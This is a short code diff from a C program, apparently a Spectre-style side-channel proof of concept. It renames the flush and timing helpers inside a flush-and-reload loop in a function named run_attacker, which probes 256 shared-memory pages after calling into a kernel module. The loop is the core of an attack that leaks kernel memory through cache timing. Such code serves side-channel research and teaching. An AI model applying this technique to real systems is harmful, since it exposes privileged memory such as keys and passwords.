@@ -59,7 +59,7 @@ int run_attacker(int kernel_fd, char *shared_memory) {
         for (int attempt = 0; attempt < 100; attempt++) {
 
             for (int i = 0; i < 256; i++) {
-                flush(shared_memory + i * 4096);
+                clflush(shared_memory + i * 4096);
             }
 
             usleep(1);
@@ -67,7 +67,7 @@ int run_attacker(int kernel_fd, char *shared_memory) {
             call_kernel_part1(kernel_fd, shared_memory, current_offset);
 
             for (int i = 0; i < 256; i++) {
-                uint64_t time = reload_t(shared_memory + i * 4096);
+                uint64_t time = time_access(shared_memory + i * 4096);
 
                 if (time < CACHE_HIT_THRESHOLD) {
                     scores[i]++;
